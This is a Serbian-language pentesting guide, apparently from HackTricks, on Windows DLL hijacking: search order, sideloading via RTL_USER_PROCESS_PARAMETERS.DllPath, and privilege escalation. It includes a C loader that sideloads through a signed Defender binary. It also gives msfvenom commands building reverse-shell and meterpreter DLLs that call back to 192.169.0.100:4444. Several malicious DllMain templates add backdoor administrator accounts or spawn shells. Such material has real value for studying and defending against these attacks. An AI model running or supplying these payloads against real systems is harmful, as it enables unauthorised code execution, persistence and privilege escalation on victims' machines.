# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju poverljivom aplikacijom da učita maliciozni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Najčešće se koristi za izvršavanje koda, postizanje persistence, i ređe za privilege escalation. Uprkos fokusu na eskalaciju ovde, metoda hijack-ovanja ostaje ista za sve ciljeve.

### Uobičajene tehnike

Koriste se različite metode za DLL hijacking, čija je efikasnost zavisna od načina na koji aplikacija učitava DLL-ove:

1. **DLL Replacement**: Zamena legitimnog DLL-a malicioznim, opcionalno koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicioznog DLL-a u putanju pre legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicioznog DLL-a koji aplikacija pokuša da učita misleći da je u pitanju nepostojeći potreban DLL.
4. **DLL Redirection**: Modifikovanje parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da se aplikacija usmeri na maliciozni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a malicioznim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicioznog DLL-a u direktorijum pod kontrolom korisnika sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

## Pronalaženje nedostajućih Dll-ova

Najčešći način za pronalaženje nedostajućih DLL-ova u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals-a, **postavljanjem** **sledеća 2 filtera**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

i prikazivanjem samo **File System Activity**:

![](<../../images/image (314).png>)

Ako tražite **missing dlls in general** ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll inside an specific executable** trebalo bi da postavite **još jedan filter kao "Process Name" "contains" "\<exec name>", pokrenete ga, i zaustavite hvatanje događaja**.

## Exploiting Missing Dlls

Da bismo izvršili privilege escalation, najbolja prilika je da možemo **napisati DLL koji će neki privilegovani proces pokušati da učita** u nekom od **mesta gde će biti pretraživan**. Dakle, možemo **upisati** DLL u **folder** gde će se **DLL pretražiti pre** foldera gde se nalazi **originalni DLL** (neobičan slučaj), ili ćemo moći **upisati u neki folder gde će se DLL pretraživati** a originalni **DLL ne postoji** u bilo kojem folderu.

### Dll Search Order

**U** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi specifično učitavaju.**

Windows aplikacije traže DLL-ove prateći skup unapred definisanih putanja pretrage, po određenom redosledu. Problem DLL hijackinga nastaje kada se štetan DLL strateški postavi u jedan od tih direktorijuma tako da bude učitan pre autentičnog DLL-a. Rešenje da se to spreči je osigurati da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Možete videti **DLL search order na 32-bitnim** sistemima ispod:

1. Direktorijum iz kojeg je aplikacija učitana.
2. System directory. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bit system directory. Ne postoji funkcija koja dobija putanju ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows directory. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi koji su navedeni u PATH environment variable. Obratite pažnju da ovo ne uključuje per-application putanju specificiranu kroz **App Paths** registry key. **App Paths** ključ se ne koristi pri izračunavanju DLL search path.

To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je on onemogućen, current directory prelazi na drugo mesto. Da onemogućite ovu opciju, kreirajte **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry vrednost i postavite je na 0 (podrazumevano je enabled).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršne module koji **LoadLibraryEx** učitava.

Na kraju, imajte u vidu da **DLL može biti učitan navodeći apsolutnu putanju umesto samo imena**. U tom slučaju taj DLL će **biti tražen samo u toj putanji** (ako taj DLL ima zavisnosti, one će se tražiti kao da su upravo učitane po imenu).

Postoje i drugi načini da se menja redosled pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je postavljanje DllPath polja u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll-ove native API-je. Ako ovde navedete direktorijum pod kontrolom napadača, ciljani proces koji rešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flag-ova) može biti primoran da učita maliciozni DLL iz tog direktorijuma.

Ključna ideja
- Izgradite process parameters sa RtlCreateProcessParametersEx i pružite custom DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljani binarni fajl reši DLL po imenu, loader će konsultovati dostavljeni DllPath tokom rezolucije, omogućavajući pouzdano sideloading čak i kada maliciozni DLL nije u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na child proces koji se kreira; razlikuje se od SetDllDirectory, koja utiče samo na trenutni proces.
- Cilj mora importovati ili LoadLibrary DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijack-ovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalan C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji eksportuje potrebne funkcije ili proxy-uje na pravi) u vaš direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da traži xmllite.dll po imenu koristeći gore opisanu tehniku. Loader rešava import putem navedenog DllPath i sideload-uje vaš DLL.

Ova tehnika je viđena u prirodi da pokreće multi-stage sideloading lance: inicijalni launcher ispusti pomoćni DLL, koji potom pokreće Microsoft-potpisani, hijackable binarni fajl sa prilagođenim DllPath-om kako bi naterao učitavanje napadačevog DLL-a iz staging direktorijuma.


#### Izuzeci u redosledu pretrage DLL-ova iz Windows dokumentacije

Windows dokumentacija beleži određene izuzetke od standardnog redosleda pretrage DLL-ova:

- Kada se naiđe na **DLL koji deli ime sa nekim koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, vrši proveru za redirekciju i manifest pre nego što zadano izabere DLL koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju te known DLL, zajedno sa svim njenim zavisnim DLL-ovima, **izostavljajući proces pretrage**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima se vrši kao da su naznačeni samo svojim **module names**, bez obzira da li je početni DLL bio identifikovan putem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), a koji **nema DLL**.
- Osigurajte da postoji **write access** za bilo koji **direktorijum** u kojem će se **DLL** **pretraživati**. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path.

Da, uslovi su teški za pronalaženje jer je **po defaultu pomalo čudno pronaći privilegovani izvršni fajl kome nedostaje DLL** i još je **čudnije imati write permissions na folderu u system path** (po defaultu to nije moguće). Međutim, u pogrešno konfigurisanom okruženju to je moguće.\
Ako imate sreće i ispunjavate ove uslove, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak iako je **glavni cilj projekta da zaobiđe UAC**, tamo možete naći **PoC** Dll hijacking-a za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera u kojem imate write permissions).

Napomena da možete **proveriti svoje dozvole u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih direktorijuma u PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti importe izvršnog fajla i eksporte dll-a pomoću:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **zloupotrebiti Dll Hijacking za eskalaciju privilegija** with permissions to write in a **System Path folder** check:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automatski alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kom folderu unutar system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Primer

Ako pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešan exploit je da **napravite dll koji izvozi bar sve funkcije koje će executable importovati iz njega**. Imajte na umu da Dll Hijacking može biti koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) or from[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Možete pronaći primer **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Štaviše, u **narednom odeljk**u možete naći neke **osnovne dll kodove** koji mogu biti korisni kao **templates** ili za kreiranje **dll with non required functions exported**.

## **Kreiranje i kompajliranje Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali i da **izlaže** i **radi** kao **očekivano** preusmeravajući sve pozive na pravu biblioteku.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti an executable and select the library** koju želite proxify i **generisati a proxified dll** ili **navesti the Dll** i **generisati a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiraj korisnika (x86, nisam video x64 verziju):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaše

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora da **eksportuje više funkcija** koje će biti učitane od strane victim process. Ako te funkcije ne postoje, **binary neće moći da ih učita** i **exploit će propasti**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Reference

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
